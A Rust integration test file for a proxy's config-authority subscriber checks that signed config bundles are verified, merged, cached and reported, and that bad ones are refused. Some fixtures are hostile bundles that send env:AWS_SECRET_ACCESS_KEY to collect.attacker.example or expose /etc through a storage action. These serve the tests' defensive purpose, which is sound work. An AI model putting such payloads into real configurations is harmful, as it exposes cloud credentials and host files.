// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Soap Bucket LLC

//! Config-authority subscriber, end to end against a stub authority.
//!
//! The authority is a hand-rolled TCP responder rather than a mock-server
//! crate on purpose: a new dependency here means refreshing every nested
//! `Cargo.lock` in the repo, and the contract under test is one
//! conditional GET.
//!
//! Bundles are signed with the shared-secret (`hmac_sha256`) algorithm,
//! also on purpose. It needs no crate this package does not already
//! depend on, and it exercises the `allow_shared_secret_keys`
//! acknowledgement. The Ed25519 path is covered by the unit tests in
//! `sbproxy-config`, and both algorithms run through the same
//! `verify_at` order.
//!
//! Every test here drives the process-wide reload transaction, so they
//! run one at a time behind [`SERIAL`].

use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::{Arc, LazyLock, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};

use base64::engine::general_purpose::STANDARD as BASE64;
use base64::Engine as _;
use sbproxy_config::config_bundle::{BundleMode, ConfigBundle, ConfigBundleSigner};
use sbproxy_config::types::{ConfigAuthorityConfig, ConfigAuthorityUpstreamConfig};
use sbproxy_core::config_subscriber::{CachedBundle, ConfigSubscriber, CycleResult};
use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
use tokio::net::TcpListener;

/// Serializes the tests in this binary. The reload path is a
/// process-wide transaction (live pipeline, provider catalog, drift
/// baseline), so two tests running at once would observe each other.
static SERIAL: LazyLock<tokio::sync::Mutex<()>> = LazyLock::new(|| tokio::sync::Mutex::new(()));

/// Shared secret behind every fixture bundle.
const SECRET: [u8; 32] = [9u8; 32];

/// Key ID every fixture bundle is signed under.
const KEY_ID: &str = "lab-shared";

// --- fixtures ---------------------------------------------------------

fn now_unix_ms() -> u64 {
    u64::try_from(
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("clock after the epoch")
            .as_millis(),
    )
    .expect("unix millis fit u64")
}

/// A minimal local document: one static origin, no secrets block, no
/// listeners to bind.
fn local_config(host: &str) -> String {
    format!(
        r#"
proxy:
  http_bind_port: 0
origins:
  "{host}":
    action:
      type: static
      status_code: 200
      content_type: text/plain
      body: local
"#
    )
}

/// An authority payload adding one origin. Overlay merges keep the local
/// origin, so a test can tell "merged" from "replaced".
fn bundle_payload(host: &str, body: &str) -> String {
    format!(
        r#"
origins:
  "{host}":
    action:
      type: static
      status_code: 200
      content_type: text/plain
      body: {body}
"#
    )
}

fn sign(revision: u64, mode: BundleMode, payload: &str) -> sbproxy_config::SignedConfigBundle {
    let signer = ConfigBundleSigner::shared_secret(KEY_ID, SECRET.to_vec()).expect("signer");
    let bundle = ConfigBundle::new(
        "authority-test",
        revision,
        mode,
        payload,
        now_unix_ms(),
        None,
    )
    .expect("bundle");
    signer.sign(bundle).expect("sign")
}

/// Write the verifying-key file the subscriber trusts.
fn write_keys(dir: &Path) -> PathBuf {
    let path = dir.join("authority-keys.json");
    let file = format!(
        r#"{{"{KEY_ID}": {{"algorithm": "hmac_sha256", "key": "{}"}}}}"#,
        BASE64.encode(SECRET),
    );
    std::fs::write(&path, file).expect("write keys");
    path
}

/// The upstream block under test. Built as a struct literal so a new
/// field cannot be added without this file deciding what it means.
fn upstream(url: &str, mode: BundleMode, dir: &Path, keys: &Path) -> ConfigAuthorityUpstreamConfig {
    let upstream = ConfigAuthorityUpstreamConfig {
        url: url.to_string(),
        mode,
        subscriber_id: "edge-01".to_string(),
        credential: None,
        verifying_keys_file: keys.display().to_string(),
        poll_interval_secs: 5,
        cache_path: dir.join("config-bundle.json").display().to_string(),
        max_staleness_secs: 86_400,
        require_bundle_on_boot: None,
        // The stub authority speaks plaintext, and the signature is what
        // actually protects the payload.
        allow_insecure_http: true,
        allow_shared_secret_keys: true,
    };
    // Every fixture must be a configuration an operator could actually
    // write, so the same validation `sbproxy validate` runs applies here.
    upstream.validate().expect("fixture upstream validates");
    ConfigAuthorityConfig {
        upstream: Some(upstream.clone()),
        // A subscriber, so no publish block. A node that sets both is
        // rejected by validate, which is what the conflict rule asserts.
        publish: None,
    }
    .validate()
    .expect("fixture block validates");
    upstream
}

fn cache_path(dir: &Path) -> PathBuf {
    dir.join("config-bundle.json")
}

fn cursor_path(dir: &Path) -> PathBuf {
    dir.join("config-bundle.json.cursor")
}

// --- stub authority ---------------------------------------------------

#[derive(Default)]
struct StubState {
    /// Body served for a `200`.
    body: Vec<u8>,
    /// When set, answer `304 Not Modified` instead.
    not_modified: bool,
    /// Requests seen, so a test can prove a cycle did or did not fetch.
    requests: usize,
    /// `If-None-Match` from the most recent request.
    last_if_none_match: Option<String>,
    /// Subscriber identity header from the most recent request.
    last_subscriber_id: Option<String>,
    /// WOR-2464: the apply-report headers from the most recent request,
    /// so a test can prove what this node told the authority it applied
    /// rather than only what it fetched.
    last_apply_status: Option<String>,
    /// `x-sbproxy-applied-revision` from the most recent request.
    last_applied_revision: Option<String>,
    /// `x-sbproxy-applied-hash` from the most recent request.
    last_applied_hash: Option<String>,
    /// `x-sbproxy-config-error` from the most recent request.
    last_apply_error: Option<String>,
}

/// A stub config authority: one conditional GET, one response.
struct StubAuthority {
    url: String,
    state: Arc<Mutex<StubState>>,
}

impl StubAuthority {
    async fn start(body: Vec<u8>) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind stub");
        let addr: SocketAddr = listener.local_addr().expect("stub addr");
        let state = Arc::new(Mutex::new(StubState {
            body,
            ..StubState::default()
        }));
        let served = Arc::clone(&state);
        tokio::spawn(async move {
            loop {
                let Ok((mut socket, _)) = listener.accept().await else {
                    return;
                };
                let state = Arc::clone(&served);
                tokio::spawn(async move {
                    let mut head = Vec::new();
                    let mut chunk = [0u8; 1024];
                    loop {
                        match socket.read(&mut chunk).await {
                            Ok(0) => break,
                            Ok(read) => {
                                head.extend_from_slice(&chunk[..read]);
                                if head.windows(4).any(|window| window == b"\r\n\r\n") {
                                    break;
                                }
                            }
                            Err(_) => return,
                        }
                    }
                    let request = String::from_utf8_lossy(&head).to_string();
                    let (not_modified, body) = {
                        let mut state = state.lock().expect("stub state");
                        state.requests += 1;
                        state.last_if_none_match = header_value(&request, "if-none-match");
                        state.last_subscriber_id =
                            header_value(&request, "x-sbproxy-subscriber-id");
                        state.last_apply_status = header_value(&request, "x-sbproxy-config-status");
                        state.last_applied_revision =
                            header_value(&request, "x-sbproxy-applied-revision");
                        state.last_applied_hash = header_value(&request, "x-sbproxy-applied-hash");
                        state.last_apply_error = header_value(&request, "x-sbproxy-config-error");
                        (state.not_modified, state.body.clone())
                    };
                    let response = if not_modified {
                        // A 304 carries no body and no content-length.
                        "HTTP/1.1 304 Not Modified\r\nconnection: close\r\n\r\n".to_string()
                    } else {
                        format!(
                            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: \
                             {}\r\nconnection: close\r\n\r\n",
                            body.len()
                        )
                    };
                    let _ = socket.write_all(response.as_bytes()).await;
                    if !not_modified {
                        let _ = socket.write_all(&body).await;
                    }
                    let _ = socket.flush().await;
                });
            }
        });
        Self {
            url: format!("http://{addr}"),
            state,
        }
    }

    fn serve(&self, body: Vec<u8>) {
        let mut state = self.state.lock().expect("stub state");
        state.body = body;
        state.not_modified = false;
    }

    fn answer_not_modified(&self) {
        self.state.lock().expect("stub state").not_modified = true;
    }

    fn requests(&self) -> usize {
        self.state.lock().expect("stub state").requests
    }

    fn last_if_none_match(&self) -> Option<String> {
        self.state
            .lock()
            .expect("stub state")
            .last_if_none_match
            .clone()
    }

    fn last_subscriber_id(&self) -> Option<String> {
        self.state
            .lock()
            .expect("stub state")
            .last_subscriber_id
            .clone()
    }
}

fn header_value(request: &str, name: &str) -> Option<String> {
    request.lines().skip(1).find_map(|line| {
        let (key, value) = line.split_once(':')?;
        key.trim()
            .eq_ignore_ascii_case(name)
            .then(|| value.trim().to_string())
    })
}

/// A URL with nothing listening on it: bind, note the port, drop the
/// listener.
async fn dead_url() -> String {
    let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind");
    let addr = listener.local_addr().expect("addr");
    drop(listener);
    format!("http://{addr}")
}

// --- live-pipeline observation ----------------------------------------

fn live_hostnames() -> Vec<String> {
    sbproxy_core::reload::current_pipeline()
        .config
        .origins
        .iter()
        .map(|origin| origin.hostname.to_string())
        .collect()
}

fn serves(host: &str) -> bool {
    live_hostnames().iter().any(|name| name == host)
}

/// Identity of the live pipeline. Every reload stores a fresh `Arc`, so
/// an unchanged pointer proves no swap happened.
fn pipeline_identity() -> usize {
    Arc::as_ptr(&sbproxy_core::reload::current_pipeline_full()) as usize
}

/// Current value of one `sbproxy_config_bundle_fetch_total{result}`
/// series, read back off the default registry so a test can prove the
/// metric is incremented at the point of use rather than merely declared.
fn fetch_total(result: &str) -> u64 {
    metric_value(
        "sbproxy_config_bundle_fetch_total",
        Some(("result", result)),
    )
}

fn applied_total() -> u64 {
    metric_value("sbproxy_config_bundle_applied_total", None)
}

fn bundle_revision_gauge() -> u64 {
    metric_value("sbproxy_config_bundle_revision", None)
}

fn metric_value(name: &str, label: Option<(&str, &str)>) -> u64 {
    for family in prometheus::gather() {
        if family.name() != name {
            continue;
        }
        for metric in family.get_metric() {
            if let Some((key, value)) = label {
                let matches = metric
                    .get_label()
                    .iter()
                    .any(|pair| pair.name() == key && pair.value() == value);
                if !matches {
                    continue;
                }
            }
            let value = match family.get_field_type() {
                prometheus::proto::MetricType::COUNTER => metric.get_counter().value(),
                prometheus::proto::MetricType::GAUGE => metric.get_gauge().value(),
                other => panic!("{name} is a {other:?}, not a counter or a gauge"),
            };
            return value as u64;
        }
    }
    0
}

/// Establish a baseline: apply revision 5, which adds `bundle_host`.
///
/// Returns the subscriber, the stub, and the temp dir (kept alive by the
/// caller so the paths stay valid).
async fn applied_baseline(
    dir: &Path,
    local_host: &str,
    bundle_host: &str,
) -> (ConfigSubscriber, StubAuthority) {
    let config_path = dir.join("sb.yml");
    std::fs::write(&config_path, local_config(local_host)).expect("write local config");
    let keys = write_keys(dir);
    let signed = sign(
        5,
        BundleMode::Overlay,
        &bundle_payload(bundle_host, "authority"),
    );
    let stub = StubAuthority::start(signed.to_json().expect("encode")).await;
    let mut subscriber = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream(&stub.url, BundleMode::Overlay, dir, &keys),
    )
    .expect("subscriber");

    assert_eq!(subscriber.poll_once().await, CycleResult::Applied);
    assert!(
        serves(local_host),
        "the local origin must survive an overlay"
    );
    assert!(serves(bundle_host), "the authority origin must be serving");
    (subscriber, stub)
}

/// Build a subscriber and a stub serving `revision`, without polling.
async fn ready_subscriber(
    dir: &Path,
    local_host: &str,
    bundle_host: &str,
    revision: u64,
) -> (ConfigSubscriber, StubAuthority) {
    let config_path = dir.join("sb.yml");
    std::fs::write(&config_path, local_config(local_host)).expect("write local config");
    let keys = write_keys(dir);
    let signed = sign(
        revision,
        BundleMode::Overlay,
        &bundle_payload(bundle_host, "authority"),
    );
    let stub = StubAuthority::start(signed.to_json().expect("encode")).await;
    let subscriber = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream(&stub.url, BundleMode::Overlay, dir, &keys),
    )
    .expect("subscriber");
    (subscriber, stub)
}

// --- tests ------------------------------------------------------------

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn first_cycle_fetches_verifies_merges_and_applies() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let ok_before = fetch_total("ok");
    let applied_before = applied_total();

    let (subscriber, stub) =
        applied_baseline(dir, "first-local.test", "first-authority.test").await;

    // The cursor advanced and was persisted, so a restart starts from
    // revision 5 rather than from zero.
    assert_eq!(subscriber.revision(), 5);
    assert!(cursor_path(dir).exists(), "the cursor must be persisted");
    let persisted = sbproxy_config::ConfigBundleCursor::load(cursor_path(dir))
        .expect("load cursor")
        .expect("cursor present");
    assert_eq!(persisted.revision, 5);

    // The verified bundle was cached so the next boot has something to
    // serve without the authority.
    let cached = CachedBundle::load(cache_path(dir))
        .expect("load cache")
        .expect("cache present");
    assert_eq!(cached.bundle.bundle.revision, 5);
    assert!(cached.received_at_unix_ms > 0);

    // The subscriber identified itself, and the first fetch carried no
    // conditional header because nothing had been applied yet.
    assert_eq!(stub.last_subscriber_id().as_deref(), Some("edge-01"));
    assert_eq!(stub.last_if_none_match(), None);

    // The metrics are incremented where the work happens.
    assert_eq!(fetch_total("ok"), ok_before + 1);
    assert_eq!(applied_total(), applied_before + 1);
    assert_eq!(bundle_revision_gauge(), 5);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn an_unchanged_revision_causes_no_reload() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "unchanged-local.test", "unchanged-authority.test").await;

    // A 304 ends the cycle: no compile, no reload, no new pipeline.
    let identity_before = pipeline_identity();
    let not_modified_before = fetch_total("not_modified");
    stub.answer_not_modified();
    assert_eq!(subscriber.poll_once().await, CycleResult::NotModified);
    assert_eq!(
        pipeline_identity(),
        identity_before,
        "a 304 must not swap the pipeline",
    );
    assert_eq!(fetch_total("not_modified"), not_modified_before + 1);

    // And the conditional request carried the cursor, which is what let
    // the authority answer 304 at all.
    let etag = stub.last_if_none_match().expect("If-None-Match sent");
    assert!(etag.contains("5-sha256:"), "{etag}");

    // An authority that ignores If-None-Match and re-serves the applied
    // revision is also a no-op, rather than a reload every interval.
    stub.serve(
        sign(
            5,
            BundleMode::Overlay,
            &bundle_payload("unchanged-authority.test", "authority"),
        )
        .to_json()
        .expect("encode"),
    );
    assert_eq!(subscriber.poll_once().await, CycleResult::NotModified);
    assert_eq!(
        pipeline_identity(),
        identity_before,
        "re-serving the applied revision must not swap the pipeline",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn boot_uses_the_cache_when_the_authority_is_unreachable() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let config_path = dir.join("sb.yml");
    let local = local_config("cached-local.test");
    std::fs::write(&config_path, &local).expect("write local config");
    let keys = write_keys(dir);

    // A cache written by a previous process.
    let signed = sign(
        9,
        BundleMode::Overlay,
        &bundle_payload("cached-authority.test", "cached"),
    );
    CachedBundle {
        received_at_unix_ms: now_unix_ms(),
        bundle: signed,
    }
    .save(cache_path(dir))
    .expect("write cache");

    let url = dead_url().await;
    let mut subscriber = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream(&url, BundleMode::Overlay, dir, &keys),
    )
    .expect("subscriber");

    let merged = subscriber
        .boot_from_cache(&local)
        .expect("a fresh cache is usable")
        .expect("the cached bundle is applied");
    assert!(
        merged.contains("cached-authority.test"),
        "the boot document must carry the authority's origins: {merged}",
    );
    assert!(
        merged.contains("cached-local.test"),
        "an overlay boot must keep the local origins: {merged}",
    );
    assert_eq!(subscriber.revision(), 9);

    // With the authority down, the cycle reports unreachable and changes
    // nothing.
    let unreachable_before = fetch_total("unreachable");
    assert_eq!(subscriber.poll_once().await, CycleResult::Unreachable);
    assert_eq!(fetch_total("unreachable"), unreachable_before + 1);
    assert_eq!(subscriber.revision(), 9, "the cursor must not move");
}

/// A config revision ring installed into the process-wide slot for the
/// duration of one test (WOR-2462).
///
/// Installed rather than mocked: the recording site under test reaches
/// the ring through that slot, so a test that swapped in something else
/// would prove only that the something else works. Restores the slot on
/// drop, so the next test does not inherit a ring pointed at a temporary
/// directory this one is about to delete.
struct HistoryRing {
    dir: PathBuf,
}

impl HistoryRing {
    /// Open a ring under `dir/config-history` and publish it.
    fn install(dir: &Path) -> Self {
        let ring = dir.join("config-history");
        let history = sbproxy_config::ConfigHistoryConfig {
            enabled: true,
            dir: ring.to_string_lossy().into_owned(),
            keep: 8,
            keep_rejected: 8,
            ..sbproxy_config::ConfigHistoryConfig::default()
        };
        let recorder =
            sbproxy_core::config_history::ConfigHistoryRecorder::from_config(Some(&history))
                .expect("ring opens")
                .expect("an enabled block yields a recorder");
        sbproxy_core::config_history::install_config_history_recorder(Arc::new(recorder));
        Self { dir: ring }
    }

    /// Every stored rejected candidate, read straight off disk rather
    /// than through the recorder: the point of the ticket is that an
    /// operator can read these files, so the test reads them the same
    /// way.
    fn rejections(&self) -> Vec<serde_json::Value> {
        let mut out = Vec::new();
        let Ok(listing) = std::fs::read_dir(self.dir.join("rejected")) else {
            return out;
        };
        for entry in listing.flatten() {
            if entry.path().extension().and_then(|e| e.to_str()) != Some("json") {
                continue;
            }
            let bytes = std::fs::read(entry.path()).expect("read rejection");
            out.push(serde_json::from_slice(&bytes).expect("decode rejection"));
        }
        out
    }

    /// The one stored rejection, asserting there is exactly one.
    fn only_rejection(&self) -> serde_json::Value {
        let stored = self.rejections();
        assert_eq!(stored.len(), 1, "exactly one stored rejection: {stored:?}");
        stored.into_iter().next().expect("one")
    }
}

impl Drop for HistoryRing {
    fn drop(&mut self) {
        // The slot has no public "clear"; moving it to the failed state
        // is what makes `current_config_history_recorder` return `None`
        // again for whatever runs next.
        sbproxy_core::config_history::install_config_history_failure("test teardown");
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_forged_signature_is_refused_and_the_previous_pipeline_keeps_serving() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "forged-local.test", "forged-authority.test").await;
    let identity_before = pipeline_identity();
    let verify_failed_before = fetch_total("verify_failed");
    let ring = HistoryRing::install(dir);

    let mut forged = sign(
        6,
        BundleMode::Overlay,
        &bundle_payload("forged-candidate.test", "forged"),
    );
    forged.signature = BASE64.encode([0u8; 32]);
    stub.serve(forged.to_json().expect("encode"));

    assert_eq!(subscriber.poll_once().await, CycleResult::VerifyFailed);
    assert_eq!(fetch_total("verify_failed"), verify_failed_before + 1);
    assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
    assert!(
        !serves("forged-candidate.test"),
        "a forged bundle must not reach the pipeline",
    );
    assert!(serves("forged-authority.test"), "revision 5 keeps serving");
    assert_eq!(subscriber.revision(), 5, "the cursor must not move");

    // WOR-2462: the node knew exactly why it refused this; the ring is
    // where that survives the log rotation.
    let stored = ring.only_rejection();
    assert_eq!(stored["reason"], "verify_failed");
    assert_eq!(stored["stage"], "config_authority");
    assert_eq!(stored["count"], 1);
    assert!(
        stored["detail"]
            .as_str()
            .expect("detail")
            .contains("verification failed"),
        "the refusing check's own message is kept: {stored:?}",
    );
    assert!(
        stored["document"]
            .as_str()
            .expect("document")
            .contains("forged-candidate.test"),
        "the refused document is kept so an operator can read it",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_bundle_that_does_not_compile_is_refused_and_the_previous_pipeline_keeps_serving() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "broken-local.test", "broken-authority.test").await;
    let identity_before = pipeline_identity();
    let compile_failed_before = fetch_total("compile_failed");
    let ring = HistoryRing::install(dir);

    // A misspelled nested key. The compiler refuses these rather than
    // silently taking the default, which is exactly the shape of change
    // an authority must not be able to push through.
    stub.serve(
        sign(6, BundleMode::Overlay, "proxy:\n  http2_cleartextt: true\n")
            .to_json()
            .expect("encode"),
    );

    assert_eq!(subscriber.poll_once().await, CycleResult::CompileFailed);
    assert_eq!(fetch_total("compile_failed"), compile_failed_before + 1);
    assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
    assert!(serves("broken-authority.test"), "revision 5 keeps serving");
    assert_eq!(subscriber.revision(), 5, "the cursor must not move");

    // WOR-2462.
    let stored = ring.only_rejection();
    assert_eq!(stored["reason"], "compile_failed");
    assert!(
        stored["document"]
            .as_str()
            .expect("document")
            .contains("http2_cleartextt"),
        "the misspelling an operator has to find is in the stored document",
    );
}

/// WOR-2464. Seen is not applied. A node that applied cleanly says so on
/// its next fetch, in OpAMP's `RemoteConfigStatus` vocabulary, and names
/// the config hash it is serving.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_clean_apply_is_reported_on_the_next_fetch() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "report-local.test", "report-authority.test").await;

    // The first cycle applied; nothing was reported on it, because the
    // node had decided nothing when it made that request.
    assert_eq!(
        stub.state.lock().expect("stub state").last_apply_status,
        None,
        "a node reports what it applied, and on the first fetch it has applied nothing",
    );

    // The next cycle carries the report. `304` is enough: the report
    // rides the fetch the subscriber already makes.
    stub.answer_not_modified();
    assert_eq!(subscriber.poll_once().await, CycleResult::NotModified);
    let state = stub.state.lock().expect("stub state");
    assert_eq!(
        state.last_apply_status.as_deref(),
        Some("applied"),
        "a clean apply reports APPLIED",
    );
    assert_eq!(
        state.last_applied_revision.as_deref(),
        Some("5"),
        "and names the revision it is actually serving",
    );
    assert!(
        state
            .last_applied_hash
            .as_deref()
            .is_some_and(|hash| !hash.is_empty()),
        "and the config hash, which is what OpAMP's RemoteConfigStatus is keyed on: {:?}",
        state.last_applied_hash,
    );
    assert_eq!(
        state.last_apply_error, None,
        "a clean apply carries no error",
    );
}

/// WOR-2464, the gap this ticket exists to close. A node that refused a
/// bundle reports FAILED with the reason, and keeps reporting the
/// revision it is **actually serving** rather than the one it refused. A
/// fleet where three nodes did this used to look identical from the
/// authority's side to a fleet that applied cleanly.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_refused_bundle_reports_failed_and_keeps_naming_the_revision_it_serves() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "refused-local.test", "refused-authority.test").await;

    stub.serve(
        sign(6, BundleMode::Overlay, "proxy:\n  http2_cleartextt: true\n")
            .to_json()
            .expect("encode"),
    );
    assert_eq!(subscriber.poll_once().await, CycleResult::CompileFailed);
    assert_eq!(subscriber.revision(), 5, "the cursor did not move");

    // The refusal is reported on the following fetch.
    stub.answer_not_modified();
    let _ = subscriber.poll_once().await;
    let state = stub.state.lock().expect("stub state");
    assert_eq!(
        state.last_apply_status.as_deref(),
        Some("failed"),
        "a refusal reports FAILED",
    );
    assert_eq!(
        state.last_applied_revision.as_deref(),
        Some("5"),
        "and names revision 5, which this node is serving, not the 6 it refused. that \
         distinction is the whole ticket",
    );
    let error = state
        .last_apply_error
        .as_deref()
        .expect("a failure carries its reason");
    assert!(
        error.contains("http2_cleartextt"),
        "the reason names the misspelling an operator has to find: {error}",
    );
    assert!(
        !error.contains('\n') && !error.contains('\r'),
        "and it is header safe, or reqwest would refuse the request and this node would \
         silently stop reporting: {error:?}",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_bundle_reading_this_nodes_environment_is_refused() {
    // WOR-2433. The deny list screens the PATHS a subscriber owns and
    // cannot screen a VALUE. `origins` is not denied, so a bundle may
    // legitimately set an origin's credential; it may not set it to a
    // reference that reads THIS node's process environment and ships the
    // result wherever the bundle's action points. `env:` carries no
    // template syntax, so the unresolved-`${VAR}` gate never sees it and
    // the substitution it performs always succeeds.
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "envref-local.test", "envref-authority.test").await;
    let identity_before = pipeline_identity();
    let refused_before = fetch_total("confinement_refused");
    let ring = HistoryRing::install(dir);

    stub.serve(
        sign(
            6,
            BundleMode::Overlay,
            r#"
origins:
  "exfil.test":
    action:
      type: proxy
      url: https://collect.attacker.example
    authentication:
      type: api_key
      api_key: "env:AWS_SECRET_ACCESS_KEY"
"#,
        )
        .to_json()
        .expect("encode"),
    );

    // Its own cycle result and its own metric label: a confinement
    // refusal names no denied path, so an operator reading `denied_path`
    // would go hunting through AUTHORITY_DENIED_PATHS for a path that is
    // not there (WOR-2433 re-review).
    assert_eq!(
        subscriber.poll_once().await,
        CycleResult::ConfinementRefused
    );
    assert_eq!(fetch_total("confinement_refused"), refused_before + 1);
    assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
    assert!(serves("envref-authority.test"), "revision 5 keeps serving");
    assert_eq!(subscriber.revision(), 5, "the cursor must not move");

    // WOR-2462.
    let stored = ring.only_rejection();
    assert_eq!(stored["reason"], "confinement_refused");
    assert!(
        stored["detail"]
            .as_str()
            .expect("detail")
            .contains("host resource"),
        "the confinement refusal explains itself: {stored:?}",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_bundle_assembling_a_host_reference_from_a_default_is_refused() {
    // WOR-2433 re-review round 3. The check above screens the raw text,
    // and `compile_config` substitutes `${VAR:-default}` before anything
    // parses it, so a bundle could write the host reference as a default
    // and have the compile assemble it: `env:AWS_SECRET_ACCESS_KEY`
    // matched none of the host-backed prefixes while it wore the
    // placeholder, and `${SB_NOPE:-path}` in mapping-key position met no
    // `HOST_FILE_KEYS` entry until the key had been substituted in. A
    // config-authority bundle is on by default with no opt-out, so this
    // is the path where it matters most.
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "default-local.test", "default-authority.test").await;
    let identity_before = pipeline_identity();

    for payload in [
        // The secret reference, assembled in value position.
        r#"
origins:
  "exfil.test":
    action:
      type: proxy
      url: https://collect.attacker.example
    authentication:
      type: api_key
      api_key: "${SB_NOPE_2433:-env:AWS_SECRET_ACCESS_KEY}"
"#,
        // The host-file key, assembled in mapping-key position: after
        // substitution this is `action.path: /etc`, which roots the
        // storage action's object store at the host filesystem.
        r#"
origins:
  "exfil.test":
    action:
      type: storage
      backend: local
      "${SB_NOPE_2433:-path}": /etc
"#,
    ] {
        let refused_before = fetch_total("confinement_refused");
        stub.serve(
            sign(6, BundleMode::Overlay, payload)
                .to_json()
                .expect("encode"),
        );
        assert_eq!(
            subscriber.poll_once().await,
            CycleResult::ConfinementRefused
        );
        assert_eq!(fetch_total("confinement_refused"), refused_before + 1);
        assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
        assert_eq!(subscriber.revision(), 5, "the cursor must not move");
    }
    assert!(serves("default-authority.test"), "revision 5 keeps serving");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_bundle_naming_a_per_node_variable_still_applies() {
    // The other half of the same boundary: `${VAR}` is the documented
    // way a fleet-wide document names per-node values, so confinement
    // must not have taken it away.
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "envok-local.test", "envok-authority.test").await;

    stub.serve(
        sign(
            6,
            BundleMode::Overlay,
            &bundle_payload("envok-authority.test", "${PATH:-fallback-body}"),
        )
        .to_json()
        .expect("encode"),
    );

    assert_eq!(subscriber.poll_once().await, CycleResult::Applied);
    assert_eq!(subscriber.revision(), 6);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_bundle_claiming_a_subscriber_owned_path_is_refused() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "denied-local.test", "denied-authority.test").await;
    let identity_before = pipeline_identity();
    let denied_before = fetch_total("denied_path");
    let ring = HistoryRing::install(dir);

    // `proxy.admin` is how an operator reaches the box when the fleet is
    // misbehaving, so the fleet does not get to configure it.
    stub.serve(
        sign(
            6,
            BundleMode::Overlay,
            "proxy:\n  admin:\n    enabled: true\n    port: 9999\n",
        )
        .to_json()
        .expect("encode"),
    );

    assert_eq!(subscriber.poll_once().await, CycleResult::DeniedPath);
    assert_eq!(fetch_total("denied_path"), denied_before + 1);
    assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
    assert!(serves("denied-authority.test"), "revision 5 keeps serving");
    assert_eq!(subscriber.revision(), 5, "the cursor must not move");

    // WOR-2462.
    let stored = ring.only_rejection();
    assert_eq!(stored["reason"], "denied_path");
    assert!(
        stored["detail"]
            .as_str()
            .expect("detail")
            .contains("proxy.admin"),
        "the denied path is named, which is the whole answer: {stored:?}",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn an_unresolved_variable_in_the_merged_document_is_refused() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "unresolved-local.test", "unresolved-authority.test").await;
    let identity_before = pipeline_identity();
    let compile_failed_before = fetch_total("compile_failed");

    // The variable is deliberately one no environment exports. The
    // compiler would only warn and leave the literal text in place, which
    // fleet-wide is a wrong value on every node at once.
    stub.serve(
        sign(
            6,
            BundleMode::Overlay,
            &bundle_payload(
                "unresolved-candidate.test",
                "${SB_TEST_UNSET_AUTHORITY_VARIABLE}",
            ),
        )
        .to_json()
        .expect("encode"),
    );

    assert_eq!(subscriber.poll_once().await, CycleResult::CompileFailed);
    assert_eq!(fetch_total("compile_failed"), compile_failed_before + 1);
    assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
    assert!(
        !serves("unresolved-candidate.test"),
        "a bundle with an unresolved reference must not reach the pipeline",
    );
    assert_eq!(subscriber.revision(), 5, "the cursor must not move");

    // The same bundle with the reference resolved to a literal applies,
    // which pins the refusal above on the reference and not on the shape.
    stub.serve(
        sign(
            6,
            BundleMode::Overlay,
            &bundle_payload("unresolved-candidate.test", "resolved"),
        )
        .to_json()
        .expect("encode"),
    );
    assert_eq!(subscriber.poll_once().await, CycleResult::Applied);
